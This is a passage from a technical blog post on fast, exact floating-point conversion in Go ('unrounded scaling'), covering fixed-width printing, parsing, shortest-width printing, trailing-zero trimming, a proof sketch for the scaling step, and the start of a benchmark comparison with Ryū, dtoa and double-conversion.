log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide 